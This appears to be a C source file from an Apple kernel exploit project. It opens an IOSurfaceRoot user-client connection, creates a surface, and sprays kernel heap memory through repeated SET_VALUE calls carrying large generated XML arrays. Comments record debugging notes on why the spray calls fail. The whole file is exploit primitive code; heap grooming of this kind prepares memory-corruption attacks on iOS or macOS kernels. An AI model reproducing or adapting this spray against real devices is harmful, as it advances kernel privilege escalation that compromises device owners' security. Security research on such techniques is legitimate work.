#include "iosurface.h"

char* createXML();

io_connect_t openIOSurfaceConnection() {
    kern_return_t err;

	CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
	if (!matching) {
		printf("Unable to create service matching dictionary\n");
		return MACH_PORT_NULL;
	}

	io_iterator_t iterator;
	err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);

	if (err != KERN_SUCCESS) {
		printf("no matches\n");
		return MACH_PORT_NULL;
	}

	io_service_t service = IOIteratorNext(iterator);

	if (service == IO_OBJECT_NULL) {
		printf("unable to find service\n");
		return MACH_PORT_NULL;
	}
	printf("got service: %x\n", service);

	io_connect_t conn = MACH_PORT_NULL;
	err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	if (err != KERN_SUCCESS) {
		printf("unable to get user client connection\n");
		return MACH_PORT_NULL;
	}
	printf("got user client connection: %x\n", conn);
	return conn;
}

uint32_t createSurface(io_connect_t conn) {
    kern_return_t err;

	char* input_string = "<dict><key>IOSurfaceAllocSize</key><integer>32</integer></dict>";
	create_surface_output_t output_struct;
	size_t output_size = sizeof(output_struct);
	err = IOConnectCallStructMethod(conn, CREATE_SURFACE,
				    input_string, strlen(input_string) + 1,
				    &output_struct, &output_size);

	if (err != KERN_SUCCESS) {
		printf("Create Surface Failed: %x\n", err);
		return 0;
	} else {
		// printf("Successfully Created Surface\n");
	}

	// testing
	// printf("1- %x\n", ((uint32_t*)(output_struct._padding))[0]);
	// printf("2- %x\n", ((uint16_t*)(output_struct._padding))[0]);
	// return ((uint32_t*)(output_struct._padding))[0];

    return output_struct.data.id;
}

int setValueSpray(io_connect_t conn, uint32_t surface_id) {
    kern_return_t err;
	char* input_string;
	uint8_t* input_struct;

	input_string = createXML();
	size_t input_string_size = strlen(input_string);
	size_t input_struct_size = sizeof(uint32_t) + input_string_size + 1;
	input_struct = malloc(input_struct_size);
	
    memcpy(input_struct, &surface_id, sizeof(uint32_t));
    memcpy(input_struct+sizeof(uint32_t), input_string, input_string_size+1);

	// size_t out_size = 0;
	// printf("calling with %s\n", input_struct+sizeof(uint32_t));
	printf("calling with %x\n", *(uint32_t*)input_struct);
	printf("calling with %p 0x%lx\n", input_struct, input_string_size + 1);
	err = IOConnectCallStructMethod(conn, SET_VALUE,
				    input_struct, input_struct_size,
				    NULL, NULL);

	// why we are failing:
	// 1. how we are calling
	// 2. surfaceID < n_surfaces
	// 3. surfaceClient null
	// 4. could not unserialize
	// 5. could not convert unserialized data to array
	// 6. could not get key or value
	if (err != KERN_SUCCESS) {
		printf("Set Value Failed: %x\n", err);
		return 1;
	} else {
		// printf("Successfully Set Value\n");
	}

	free(input_string);
	free(input_struct);

    return 0;
}

char* createXML() {
	char* start_str = "<array><array>";
	char* end_str = "</array><string>spray</string></array>";

	uint8_t* zeroes = calloc(XML_DATA_SIZE, sizeof(uint8_t));
	char* zeroes_b64_str = bytesToB64(zeroes, XML_DATA_SIZE);
	free(zeroes);
	char* data_str = calloc(strlen("<data></data>") + strlen(zeroes_b64_str) + 1, sizeof(char));
	memcpy(data_str, "<data>", strlen("<data>"));
	memcpy(data_str+strlen("<data>"), zeroes_b64_str, strlen(zeroes_b64_str));
	memcpy(data_str+strlen("<data>")+strlen(zeroes_b64_str), "</data>", strlen("</data>"));
	free(zeroes_b64_str);

	size_t start_size = strlen(start_str);
	size_t data_size = strlen(data_str);
	size_t data_size_total = data_size * 1024;
	size_t end_size = strlen(end_str);
	size_t xml_size = start_size + data_size_total + end_size;

	char* xml_str = calloc(xml_size + 1, sizeof(char));
	memcpy(xml_str, start_str, start_size);
	for (int i = 0; i < 1024; i++) {
		memcpy(xml_str+start_size+(i*data_size), data_str, data_size);
	}
	memcpy(xml_str+start_size+data_size_total, end_str, end_size);
	return xml_str;
}
